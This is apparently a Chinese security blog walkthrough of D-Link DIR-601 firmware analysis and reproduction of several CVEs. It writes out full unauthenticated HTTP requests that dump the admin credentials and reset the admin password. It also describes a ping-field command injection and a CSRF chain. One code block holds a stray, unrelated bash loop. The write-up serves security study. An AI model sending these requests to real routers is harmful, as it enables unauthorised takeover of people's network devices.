# D-Link DIR-601 固件分析及漏洞复现
> GroundCTL2MajorTom
> 来源：https://www.iotsec-zone.com/article/447

### 前言

固件有些老，但作为初学者有一定的学习参考价值。：）

### 信息搜集

固件名：DIR601B1_FW202NAb01.bin

- 型号：dir-601
- 版本：FW202NAb01
- 官网：[https://www.DLINK.com/](https://www.DLINK.com/)
- 测试环境：Ubuntu 22.04

binwalk -Me解包

进入squashfs文件系统

![0.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t6cqhnqvo2pqhpv.png)
firmwalk进行枚举

```
-------------------- admin --------------------
/mnt/services
/mnt/nvram.default
/mnt/shadow
/mnt/passwd
/mnt/www/xml/hints.xml
/mnt/www/xml/help.xml
/mnt/www/xml/lang.xml
/mnt/www/xml/msg.xml
/mnt/www/rt/login_real.htm
/mnt/www/rt/support_men.htm
/mnt/www/rt/wizard_default.htm
/mnt/www/rt/st_routing.htm
/mnt/www/rt/support_tools.htm
/mnt/www/rt/wizard_wan.htm

-------------------- root --------------------
/lib/libip6tc.so.0.0.0
/lib/libip4tc.so.0.0.0
/lib/pppd/2.4.4/rp-pppoe.so
/lib/libavahi-core.so.7.0.2
/sbin/ip
/sbin/igmpproxy
/sbin/tc
/sbin/pppoe-relay
/sbin/clink
/sbin/dnsmasq
/sbin/avahi-daemon
/sbin/inadyn
/sbin/miniupnpd
/sbin/pppd
/usr/sbin/hostapd
/usr/bin/wan_manager
/usr/bin/lighttpd
/usr/bin/my_cgi.cgi
/mnt/lighttpd/lighttpd.conf
/mnt/shadow
/mnt/passwd
/mnt/www/xml/html_info.xml
/mnt/www/xml/hints.xml
/mnt/www/xml/help.xml
/mnt/www/xml/lang.xml
/mnt/www/xml/rule_num.xml
/mnt/www/xml/msg.xml
/mnt/www/rt/tools_admin.htm
/mnt/www/js/public.js
/mnt/group
/bin/busybox

-------------------- password --------------------
/lib/libuClibc-0.9.30.so
/lib/pppd/2.4.3/openl2tp/ppp_unix.so
/sbin/msmtp
/sbin/inadyn
/sbin/pppd
/usr/sbin/hostapd
/usr/bin/widgetd
/usr/bin/my_cgi.cgi
/usr/bin/daemon_manager
/mnt/www/xml/hints.xml
/mnt/www/xml/help.xml
/mnt/www/xml/lang.xml
/mnt/www/xml/msg.xml
/mnt/www/rt/wireless.htm
/mnt/www/rt/tools_email.htm
/mnt/www/rt/tools_admin.htm
/mnt/www/rt/login_real.htm
/mnt/www/rt/tools_ddns.htm
/mnt/www/rt/wan_pptp.htm
/mnt/www/rt/wan_l2tp.htm
/mnt/www/rt/wizard_default.htm
/mnt/www/rt/wan_poe.htm
/mnt/www/rt/wizard_wan.htm
/mnt/www/js/public.js
/mnt/www/js/jquery-1.4.2.min.js
/mnt/wpa2/hostapd.eap_user
/bin/busybox

-------------------- passwd --------------------
/lib/libuClibc-0.9.30.so
/sbin/msmtp
/sbin/pppd
/usr/bin/mailosd
/mnt/services
/mnt/nsswitch.conf

-------------------- pwd --------------------
/lib/libuClibc-0.9.30.so
/bin/busybox

-------------------- dropbear --------------------

-------------------- ssl --------------------
/sbin/msmtp
/sbin/crowdcontrol
/usr/bin/lighttpd
/mnt/lighttpd/lighttpd.conf

-------------------- private key --------------------
/sbin/msmtp

-------------------- telnet --------------------
/mnt/services
/mnt/www/rt/adv_virtual.htm
/bin/busybox

-------------------- secret --------------------
/lib/libwpa_common.so
/sbin/pppd
/usr/lib/libwpa_common.so
/usr/sbin/openl2tpd
/usr/bin/widgetd
/mnt/www/xml/help.xml
/mnt/www/xml/lang.xml
/mnt/www/js/object.js

-------------------- pgp --------------------
/mnt/lighttpd/conf.d/mime.conf

-------------------- gpg --------------------

-------------------- token --------------------
/lib/libexpat.so.1.5.2
/sbin/igmpproxy
/sbin/tc
/sbin/pppd
/usr/sbin/hostapd
/bin/busybox

-------------------- api key --------------------

-------------------- oauth --------------------

-------------------- cmd= --------------------
/lib/modules/statistics_module.ko

-------------------- exec= --------------------

-------------------- command= --------------------
/usr/sbin/hostapd

-------------------- config --------------------
/lib/modules/2.6.31/net/ath_dev.ko
/lib/libuClibc-0.9.30.so
/lib/pppd/2.4.3/openl2tp/ppp_unix.so
/sbin/udhcpd
/sbin/ip
/sbin/igmpproxy
/sbin/dnsmasq
/sbin/inadyn
/sbin/miniupnpd
/sbin/pppd
/usr/sbin/hostapd
/usr/sbin/wpatalk
/usr/sbin/openl2tpd
/usr/bin/lighttpd
/usr/bin/wlan_manager
/mnt/lighttpd/modules.conf
/mnt/lighttpd/lighttpd.conf
/mnt/www/xml/html_info.xml
/mnt/miniupnpd.conf.old
/bin/busybox
-------------------- credentials --------------------
/lib/libavahi-core.so.7.0.2
/mnt/www/xml/help.xml

##################################### lighttpd
/usr/bin/lighttpd
/tmp/log/lighttpd
/mnt/lighttpd
-------------------- cgi --------------------
/usr/sbin/my_cgi.cgi
```

可见服务由lighttpd启动
![1.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t6vi065ndiraeoy.png)

关键性cgi：my_cgi.cgi
![2.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t788edxyykzpkpi.png)

查找未授权访问页面
用自己写的脚本enumUnauth 枚举后得到疑似未授权的weblist

![3.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t7flc9920zksgpz.png)

​		工具github地址：
​		[https://github.com/GroundCTL2MajorTom/enumUnauth](https://github.com/GroundCTL2MajorTom/enumUnauth)

用浏览器插件bulk批量访问后得到一个未授权访问的页面[http://192.168.0.1/my_cgi.cgi?0.7543305713163453](http://192.168.0.1/my_cgi.cgi?0.7543305713163453)

![4.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t89nhqn6hhyheat.png)

这里可以未授权查看系统信息

![5.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t8f9zzugiohupqh.png)

**启动项分析**

rcS 文件

```
#!/bin/ash

# This script runs when init it run during the boot process.
# Mounts everything in the fstab
mount -a                   // 挂载/etc/fstab中列出的所有文件系统
mount -o remount +w /      // 将根文件系统重新挂载为可写模式

# Mount the RAM filesystem to /tmp
mount -t tmpfs tmpfs /tmp  // 将内存文件系统挂载到/tmp目录

# copy all files in the mnt folder to the etc folder
cp -a /mnt/* /etc           // 复制/mnt文件夹下的所有文件到/etc文件夹

# Create necessary directories
mkdir -p /var/etc
mkdir -p /var/firm
mkdir -p /var/log
mkdir -p /var/misc
mkdir -p /var/run
mkdir -p /var/sbin
mkdir -p /var/tmp
mkdir -p /tmp/var

# Start system_manager and tftpd as background processes
system_manager &           // 启动system_manager后台进程
tftpd &                    // 启动tftpd后台进程
```

IDA二进制查看system_manager文件

![6.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t8qai9hvn2wjprt.png)

初始化系统：

```
int init_system()
{
  load_entry();                   // 载入程序入口（可能是某些配置或程序初始化）
  init_gpio();                    // 初始化GPIO（通用输入输出）接口

  system("%s %s");                // 使用系统命令执行某个未知的操作，传入两个参数（字符串形式）
  system("%s %s");                // 同上，执行另一个未知的操作，传入两个参数

  set_system_info();              // 设置系统信息
  set_network_bridge();           // 设置网络桥接

  set_host_name();                // 设置主机名（设置设备或系统的主机名）

  sleep(5u);                      // 休眠5秒，等待一些操作完成（`5u`表示5的无符号整数，单位为秒）

  byte_41393C = get_port_link_status("eth0", 4);  // 获取指定网络接口（eth0）的端口链接状态

  init_managers();                // 初始化管理器

  init_web_server();              // 初始化Web服务器（启动一个Web服务，提供Web接口）

  system("switch_notifier &");    // 启动一个名为 `switch_notifier` 的后台进程

  return system("wan_led_control &");  // 启动一个名为 `wan_led_control` 的后台进程，并返回其执行结果
}
```

进入init_web_server函数

```
int init_web_server()
{
  init_html_files();    // 初始化用于Web服务器所需的静态文件

  system("sed -i 's/^#.*\"mod_404redirect\"/ \"mod_404redirect\"/g' /etc/lighttpd/modules.conf");
  // 使用系统命令调用 `sed` 工具，用来修改 `/etc/lighttpd/modules.conf` 文件，启用名为 `mod_404redirect` 的模块

  update_lighttpd_user_conf();   // 更新 lighttpd 的用户配置文件（假设这个函数更新了与用户相关的配置）

  system("mkdir %s");   // 使用系统命令创建一个目录，但是代码中缺少目录名称参数，这可能导致问题

  return system("lighttpd -f %s &");
  // 使用系统命令启动 lighttpd 服务器，`-f %s` 是参数，用来指定 lighttpd 的配置文件路径
}
```

lighttpd就是这样起来的，再查看更新用户配置的函数update_lighttpd_user_conf()

```c
FILE *update_lighttpd_user_conf()
{
  void *v0;            // 用于内存分配的指针
  int i;               // 循环计数器
  int v2;              // 用于存储计算的偏移量
  const char *v3;      // 辅助字符串指针
  char *v4;            // 辅助字符串指针
  int v5;              // 比较结果
  const char *v6;      // 中间件对象数据指针
  FILE *result;        // 返回的文件指针
  FILE *v8;            // 文件指针
  void *ptr[5];        // 中间件对象数组
  int v10[5];          // 辅助整数数组
  char v11[36];        // 存储 admin_user_name 的缓冲区
  char v12[36];        // 存储 admin_user_pwd 的缓冲区
  char v13[80];        // 存储最终写入文件的格式化字符串

  // 初始化缓冲区
  memset(v11, 0, 0x21u);  // 清空 v11
  memset(v12, 0, 0x21u);  // 清空 v12

  // 创建中间件对象
  create_midware_obj(ptr);  // 初始化中间件对象，存储在 ptr[0] 中
  v0 = malloc(0x5CBA0u);    // 分配约374 KB的内存并赋给 v0
  ptr[0] = v0;              // 将分配的内存地址存储在 ptr[0] 中

  // 处理中间件对象中的数据
  if (v0)
  {
    memset(v10, 0, sizeof(v10));  // 清空辅助整数数组

    // 查找 admin_user 的配置值
    if (!((int (__fastcall *)(int *, const char *, _DWORD, void *))ptr[1])(v10, "admin_user", 0, v0))
    {
      // 循环处理中间件对象数据
      for (i = 0;; ++i)
      {
        v6 = (const char *)ptr[0];  // 获取中间件对象数据指针
        if (i >= *((_DWORD *)ptr[0] + 1))  // 判断是否超出数据项数量
          break;

        v2 = 633 * i;  // 计算偏移量
        if (strcmp((const char *)ptr[0] + 633 * i + 8, "admin_user_name"))  // 检查是否为 admin_user_name
        {
          v5 = strcmp(&v6[633 * i + 8], "admin_user_pwd");  // 检查是否为 admin_user_pwd
          v4 = v12;  // 设置辅助指针为 v12
          if (v5)  // 如果不是 admin_user_pwd，则继续下一个循环
            continue;
          v3 = &v6[v2 + 40];  // 设置 v3 指向 admin_user_pwd 的值
        }
        else
        {
          v3 = &v6[v2 + 40];  // 设置 v3 指向 admin_user_pwd 的值
          v4 = v11;  // 设置辅助指针为 v11
        }
        strcpy(v4, v3);  // 复制值
      }
    }
    free(ptr[0]);  // 释放内存
  }

  // 打开或创建文件 /etc/lighttpd/lighttpd.user
  result = fopen("/etc/lighttpd/lighttpd.user", "w");
  v8 = result;
  if (result)
  {
    // 格式化要写入的字符串
    memset(v13, 0, sizeof(v13));  // 清空 v13
    sprintf(v13, "%s:%s", v11, v12);  // 格式化 admin_user_name:admin_user_pwd
    fputs(v13, v8);  // 将格式化字符串写入文件
    return (FILE *)fclose(v8);  // 关闭文件并返回结果
  }
  return result;  // 返回文件指针（或者 NULL 如果打开文件失败）
}
```

admin_user_name:admin_user_pwd就这样被写进去了

### 漏洞复现

#### ping功能下的RCE

![7.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t8zmyxbcibrztns.png)

这里看到ping test就试一下命令执行，先抓包分析一下

![8.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t956pf9kwouzz8h.png)

抓包提交到了my_cgi.cgi
ida打开my_cgi.cgi分析一下，定位到ping_test函数

![9.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31t9ipaes9qmri9uy.png)

可以看到sprintf函数把传进来的参数（ip地址）拼接成系统命令，并在下方的system函数执行

开始尝试拼接执行系统命令

![10.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31uf8c6w9axgalr8y.png)

![11.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31ufeqzdvwdnvuhbl.png)

成功写入

#### [CVE-2018-5708](https://nvd.nist.gov/vuln/detail/CVE-2018-5708) 信息泄露

POC

![12.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31ta0gyorgreyfabm.png)

在发往my_cgi.cgi的数据包中结合加入`request=load_settings&table_name=admin_user`即可返回XML格式的用户名密码

```
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <login_level>1</login_level>
    <admin_user>
        <admin_user_name>
        	  admin
        </admin_user_name>
        <admin_user_pwd>
        	 123456
        </admin_user_pwd>
        <admin_level>
        	  1
        </admin_level>
    </admin_user>
</root>
```

可以看出是参数admin_user把整个table都读出来了

由于发往my_cgi.cgi的数据包是在登录页面login_real.htm中抓到的

![13.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tagoee8kddvn0wc.png)

分析login_real.htm代码

![14.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31takutsnct3rk9sr.png)

```
POST /my_cgi.cgi?0.42868205431214634 HTTP/1.1

Host: 192.168.0.1

Content-Length: 78

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: http://192.168.0.1

Referer: http://192.168.0.1/login_real.htm

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

request=no_auth&request=load_settings&table_name=no_auth&table_name=admin_user
```

那么参数在后台又是如何传递的呢？

打开IDA

找到load_settings函数

![15.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tasgirkfwcirq6o.png)

可以看到先检查了有没有no_auth参数

然后一步一步查看table_name是否匹配

![16.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tay1y4f0ugse4rt.png)

走到这里的时候，假设table_name=admin_user 一直没有匹配的情况下，执行了这条。感觉IDA不是很准，打开Ghidra

![17.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tb4e6hpff8txbsj.png)

分析该代码

```
iVar1 = (*(code *)param_1[1])
(&reading_file,iVar4,0,*param_1);
//这行代码的作用是调用一个通过 param_1[1] 指针指向的函数，并将其返回值赋给 iVar1。具体函数的功能和返回类型需要根据 param_1 的定义和对应函数的实现来确定。
#!/bin/bash

while true
do
    clear 
    ps aux
    sleep 1
done
```

这里应该是调用param_1[1] 指针指向的函数，执行readingfile操作，找的是那个文件呢？

在文件结构中搜索admin_user_pwd

![18.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tba9jx9xljrcnu2.png)

默认的用户名密码被存在nvram_default中
FirmAE进shell查找未果

![19.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tbf4r5dvp4onz8y.png)

这里启动时应该是调用了nvram把密码写入到了内存，eeprom里面

```
NVRAM（Non-Volatile Random-Access Memory，非易失性随机存取存储器）是一种存储设备，能够在电源断电的情况下保持数据。与传统的 RAM（随机存取存储器）不同，RAM 是易失性的，即在断电时数据会丢失。NVRAM 通过不同的技术可以在断电后保持数据，例如：

闪存（Flash Memory）：一种常见的 NVRAM 类型，广泛用于存储数据，如固态硬盘（SSD）和 USB 闪存驱动器。

EEPROM（Electrically Erasable Programmable Read-Only Memory）：允许电气擦除和重新编程的只读存储器，常用于存储固件或配置数据。

FRAM（Ferroelectric RAM）：使用铁电材料来实现数据存储，具有快速写入和高耐久性的特点。

PROM（Programmable Read-Only Memory） 和 EPROM（Erasable Programmable Read-Only Memory）：早期的非易失性存储技术，现已被闪存和 EEPROM 替代。

NVRAM 的主要用途包括：

存储固件：嵌入式系统和计算机中的固件常常存储在 NVRAM 中，以确保在重新启动后仍能使用。
保存配置设置：例如路由器、交换机等网络设备中的配置数据通常存储在 NVRAM 中。
设备状态：一些设备可能将状态信息存储在 NVRAM 中，以便在重新启动后能够恢复到先前的状态。
NVRAM 的主要优点是它能够在断电情况下保留数据，适合需要持久保存配置信息或系统状态的应用。
```

![20.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tbph33040suw7gr.png)

![21.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tbv9bm65f0g0crj.png)

#### [CVE-2018-10641](https://nvd.nist.gov/vuln/detail/CVE-2018-10641)

D-Link DIR-601 A1 1.02NA 设备不需要旧密码即可更改密码，密码以明文形式进行。

```
拥有网络访问权限，尽管未经身份验证，攻击者可以确定用户名和密码。通过代理或 MITM 访问配置主机访问的 URL，用户名和密码以 BASE64 编码传递以进行登录，并以明文形式传递以重置密码。注意：重置管理员密码不需要当前密码。
```

这里使用的是版本是 2.02NA 但该漏洞仍然存在。

web页面修改密码并抓包

![22.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tc71p5pmn8yxoca.png)

![23.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tcfpbeg2h1iswfb.png)

将admin_user_pwd修改，发包并修改成功。后进入web页面用密码admin3正常**登录成功**

观察这个包

```
POST /my_cgi.cgi?0.17187552205421389 HTTP/1.1

Host: 192.168.0.1

Content-Length: 285

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: http://192.168.0.1

Referer: http://192.168.0.1/tools_admin.htm

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

request=update_entry&table_name=admin_user&rowid=0&admin_user_pwd=123456&request=update_entry&table_name=system&rowid=0&gateway_name=DIR-601&request=update_entry&table_name=graph_auth&rowid=0&graph_auth_enable=0&request=update_entry&table_name=remote_management&rowid=0&remote_enable=0
```

这里除了一个可以随意变换的时间戳之外，没有任何对当前用户是否登录的校验，并且密码居然使用明文传输。

因此攻击者可以在不登陆的情况随意修改路由器密码。

#### [CVE-2018-12710](https://nvd.nist.gov/vuln/detail/CVE-2018-12710)

An issue was discovered on D-Link DIR-601 2.02NA devices. Being local to the network and having only "User" account (which is a low privilege account) access, an attacker can intercept the response from a POST request to obtain "Admin" rights due to the admin password being displayed in XML.

和CVE-2018-10641一样

#### [CVE-2019-16326](https://nvd.nist.gov/vuln/detail/CVE-2019-16326)

D-Link DIR-601 B1 2.00NA devices have CSRF because no anti-CSRF token is implemented. A remote attacker could exploit this in conjunction with CVE-2019-16327 to enable remote router management and device compromise. NOTE: this is an end-of-life product.

CSFRF漏洞

这个洞相第二个未验证修改密码的进一步应用

首先通过信息泄露获取admin的密码登录进入

然后修改dns和admin密码，抓包

修改密码的包：

![24.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tcrg8z00pkdzid0.png)
修改dns的包：

![25.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tcwty2gkxduu3c2.png)
把两个包的参数一结合，发包，您猜怎么着

![26.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31td2frzpmnda48ax.png)

修改成功

![27.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31td7fixolupkfhl2.png)

burp生成poc

![28.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tdch53d0cwshil0.png)

模拟攻击成功

![29.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tdhsz9pm8zglbgp.png)

这个csrf属实是脱裤子放屁。。。

#### [CVE-2019-16327](https://nvd.nist.gov/vuln/detail/CVE-2019-16327)

![30.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tdugkxbltlf6adg.png)

点进去还是上面那哥们提交的，超链接都是同一个，纯属CVE混子，**一个2018年**的未授权的漏洞硬生生让他整了**两个2019**的cve编号。

![31.png](https://www.iotsec-zone.com/api/image/v2/20240729/d31tdzefm7s0oknwdd.png)
